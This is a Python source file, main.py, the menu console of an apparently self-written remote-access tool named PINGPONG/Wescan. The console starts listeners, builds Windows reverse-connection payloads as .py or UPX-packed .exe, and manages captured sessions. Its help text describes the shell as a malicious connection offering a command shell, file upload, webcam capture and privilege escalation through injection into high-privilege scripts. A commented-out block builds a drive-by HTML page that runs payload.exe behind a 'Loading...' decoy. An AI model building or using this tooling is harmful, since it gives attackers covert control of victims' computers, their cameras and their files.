# -*- coding:utf-8 -*-
# @FileName  :main.py
# @Time      :2022/11/07 20:27:59
# @Author    :D0WE1L1N
import handler 
import config_set
import threading
import sys
#print的基本函数
#PINPONG 攻击载荷文件夹：payload/PINGPONG_payload_file
def print_error(str):
    print('\033[0;31m'+ str + '\033[0m')
def print_good(str):
    print('\033[0;36m'+ str + '\033[0m')
def print_warn(str):
    print('\033[0;33m'+ str + '\033[0m')
def print_normal(str):
    print('\033[0;34m'+ str + '\033[0m')
#主程序
def print_main():
    print_good(
        '''\033[0;35m
(    (        )             (        )      )            ____5 
)\ ) )\ )  ( /(  (          )\ )  ( /(   ( /(  (        |   / 
(()/((()/(  )\()) )\ )      (()/(  )\())  )\()) )\ )     |  /  
/(_))/(_))((_)\ (()/(       /(_))((_)\  ((_)\ (()/(     | /   
(_)) (_))   _((_) /(_))_    (_))    ((_)  _((_) /(_))_   |/    
| _ \|_ _| | \| |(_)) __|   | _ \  / _ \ | \| |(_)) __| (      
|  _/ | |  | .` |  | (_ |   |  _/ | (_) || .` |  | (_ | )\     
|_|  |___| |_|\_|   \___|   |_|    \___/ |_|\_|   \___|((_)    
                                                            

========================WELCOME !!========================
====================Wescan   V0.0.3.1 ====================
====================Aurthor : D0WE1L1N====================                                                                                                                
    \033[0m''')
    main()
#选择
def sub_main():
    session_pool = config_set.load_config_for_main_py('connect_pool')
    choice = input("choose your choice>")
    if session_pool == None or session_pool == []:
        if choice == '' or choice == ' ':
            sub_main()
        elif choice == "1":
            startserver()
        elif choice == "2":
            sys.path.append('./payload')
            import payload_packer
            def payload_choice():
                print_normal("type of payload:")
                print_normal("1) PINGPONG windows x64")
                type = input("payload>[*]choose your payload type>")
                back_to_main(type)
                if type == "1":
                    # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
                    print_normal('the format of the payload')
                    print_normal('1) .py')
                    print_normal('2) .exe')
                    # print_normal('3) .html')
                    _format = input('payload>[*]choose your format>')
                    back_to_main(_format)
                    if _format == '1':
                        upx_dir = ' '
                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.py')
                    elif _format == '2':
                        upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
                        back_to_main(upx_dir)
                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
#                     elif _format == '3':
#                         upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
#                         back_to_main(upx_dir)
#                         payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
#                         os.mkdir('./payload_html')
#                         with open('./payload_html/index.html', 'w') as f:
#                             f.write(''' 
# <script language="javascript">
# run_exe="<OBJECT ID=/"RUNIT/" WIDTH=0 HEIGHT=0 TYPE=/"application/x-oleobject/""
# run_exe+="CODEBASE=/"payload.exe#version=1,1,1,1/">"
# run_exe+="<PARAM NAME=/"_Version/" value=/"65536/">"
# run_exe+="</OBJECT>"
# run_exe+="<HTML><H1>Loading...... Please Don't close</H1></HTML>";
# document.open();
# document.clear();
# document.writeln(run_exe);
# document.close();
# </script>
# ''')
#                         shutil.copy('./payload.exe', './payload_html/payload.exe') 
#                         os.remove('./payload.exe')
                else:
                    print_error('[-]no such choice')
                    payload_choice()
            payload_choice()
        elif choice == '3':
            import config.config_settings_GUI
            config.config_settings_GUI.load_all_config()
            t = threading.Thread(target=config.config_settings_GUI.settings_GUI_INIT())
            t.start()
            t.join()
            is_auto_load_config = config_set.load_config_for_main_py("is_auto_load_config")
            is_auto_load_config = is_auto_load_config.get()
            if is_auto_load_config == 1:
                config_set.config_load()
            else:
                print_warn("use 'reload' command to load your settings!")
            sub_main()
        elif choice == '4' or choice == 'help' or choice == 'HELP':
            print_good(""" 
    -----------------------------HELP-----------------------------
    for main:
        command:
            1) handler
                start a listener on a ip and port
                an ip and port must be given
            2) payload
                make a payload which can send a socket connect to a ip and port
                an ip and port must be given
                it will be a .exe file
                start a handler and use that file and u can start a PINGPONG connection
            3) settings
                for handler:
                    listen_Default_ip : the ip to bind when the ip is not given when u use the handler
                    listen_Default_port : the port to bind when the port is not given when u use the handler
                    Autocommand : the command which will run immediately when u got a PINGPONG shell
                for payload:
                    Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
                    Default_port : The port to sent the connect when the port is not given when u use the payload generater
                    usage : the usage of the payload
            4) Help
                for help
            5) Session(s)
                if you have already background some session(s), use this to choose your session to back interactive mode
                if you do not, you will not have this choose
    for PINGPONG shell
        the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
        usage:
            the usage of the shell is set when you generate the payload
            a PINGPONG payload must have those usage:
                exit : exit the connection
                help : for help
                show_usage : print out the usage(s) the payload has
                PING : check the connection. If it is good, return PONG
                info : printout the ip and port of both the hosts
            the below usage will be activate if u set it when u are generating the payload
            if u have this usage, type command to use it:
                cmd : make a cmd connection
                upload : upload your file
                cam_shot : take shot
                priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
            
            """)
            main()

        elif choice == "PING":
            print("PONG")
            sub_main()
        elif choice == "exit":
            print("exiting......")
            sys.exit(0)
        elif choice == "reload":
            config_set.config_load()
            print_normal('settings>[*]Done')
            sub_main()
        else:
            print_error("[-]no such choice")
            main()
    else:
        if choice == "1":
            startserver()
        elif choice == "2":
            def payload_choice():
                print_normal("type of payload:")
                print_normal("1) PINGPONG windows x64")
                type = input("payload>[*]choose your payload type>")
                back_to_main(type)
                if type == "1":
                    # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
                    print_normal('the format of the payload')
                    print_normal('1) .py')
                    print_normal('2) .exe')
                    _format = input('payload>[*]choose your format>')
                    back_to_main(_format)
                    if _format == '1':
                        upx_dir = ' '
                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.py')
                    elif _format == '2':
                        upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
                        back_to_main(upx_dir)
                        payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
                    else:
                        print_error('[-]so such choice')
                        payload_choice()
                    main()
                else:
                    print_error('[-]no such choice')
                    payload_choice()
            payload_choice()
        elif choice == '3':
            import config.config_settings_GUI
            config.config_settings_GUI.load_all_config()
            t = threading.Thread(target=config.config_settings_GUI.settings_GUI_INIT())
            t.start()
            t.join()
            is_auto_load_config = config_set.load_config_for_main_py("is_auto_load_config")
            is_auto_load_config = is_auto_load_config.get()
            if is_auto_load_config == 1:
                config_set.config_load()
            else:
                print_warn("use 'reload' command to load your settings!")
            sub_main()
        elif choice == '4' or choice == 'session' or choice == 'SESSION':
            def back_to_sessions():
                number_of_sessions = len(session_pool)
                id_list = [i for i in range(1, number_of_sessions + 1)]
                print_normal('''
    sessions>[*]All the sessions: 
    id   ----type----    -------------------info-------------------
                ''')
                for i in id_list:
                    session = session_pool[i - 1]
                    print_normal(f'''
    {i}  {session[5]}  {session[1]} : {session[2]} ---> {session[3]} : {session[4]}         ''')
                try:
                    input_id = int(input("sessions>[*]type the id of the session(type 'back' for main console)>"))
                    back_to_main(input_id, is_print=True)
                    session = session_pool[input_id - 1]
                except Exception as e:
                    print(e)
                    print_error("sessions>[-]input error")
                    back_to_sessions()
                session[0].send(bytes('OK', 'utf8'))
                if session[5] == 'PINGPONG session':
                    handler.PINGPONG_shell(session[0], session[1], session[2], session[3], session[4], False, '')
                elif session[5] == 'CMD session':
                    import PINGPONG_script.cmdshell
                    # [cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session']
                    # (cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session)
                    PINGPONG_script.cmdshell.cmd_shell(session[0], session[1], session[2], session[3], session[4], ' ', None, None)
            back_to_sessions()
        elif choice == '5' or choice == 'help' or choice == 'HELP':
            print_good(""" 
    -----------------------------HELP-----------------------------
    for main:
        command:
            1) handler
                start a listener on a ip and port
                an ip and port must be given
            2) payload
                make a payload which can send a socket connect to a ip and port
                an ip and port must be given
                it will be a .exe file
                start a handler and use that file and u can start a PINGPONG connection
            3) settings
                for handler:
                    listen_Default_ip : the ip to bind when the ip is not given when u use the handler
                    listen_Default_port : the port to bind when the port is not given when u use the handler
                    Autocommand : the command which will run immediately when u got a PINGPONG shell
                for payload:
                    Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
                    Default_port : The port to sent the connect when the port is not given when u use the payload generater
                    usage : the usage of the payload
            4) Help
                for help
            5) Session(s)
                if you have already background some session(s), use this to choose your session to back interactive mode
                if you do not, you will not have this choose
    for PINGPONG shell
        the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
        usage:
            the usage of the shell is set when you generate the payload
            a PINGPONG payload must have those usage:
                exit : exit the connection
                help : for help
                show_usage : print out the usage(s) the payload has
                PING : check the connection. If it is good, return PONG
                info : printout the ip and port of both the hosts
            the below usage will be activate if u set it when u are generating the payload
            if u have this usage, type command to use it:
                cmd : make a cmd connection
                upload : upload your file
                cam_shot : take shot
                priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
            
            """)
            main()

        elif choice == "PING":
            print("PONG")
            sub_main()
        elif choice == "exit":
            print("exiting......")
            sys.exit(0)
        elif choice == "reload":
            config_set.config_load()
            print_normal('settings>[*]Done')
            sub_main()
        else:
            print_error("[-]no such choice")
            main()

def main():
    print_normal("Active choice:")
    print_normal("1) Start a PINGPONG handler")
    print_normal("2) Make payload(s)")
    print_normal("3) Settings")
    session_pool = config_set.load_config_for_main_py('connect_pool')
    if session_pool == None or session_pool == []:
        print_normal("4) Help")
    else:
        print_normal("4) Session(s)")
        print_normal("5) Help")
    sub_main()
def startserver():
    handler.startserver(True, is_input=True)
def config_load_init():
    global _global_dict
    _global_dict = {}
def set_config(key, value):
    _global_dict[key] = value
def get_value(key, defValue=None):
    try:
        return _global_dict[key]
    except KeyError:
        return defValue
def get_all_keys():
    key_list = []
    for key in _global_dict.keys():
        key_list.append(key)
    return key_list 
def back_to_main(var, is_print=True):
    if var == 'back' or var =='BACK':
        if not is_print:
            sub_main()
        else:
            main()
if __name__ == "__main__":
    config_set.config_load()
    print_main()
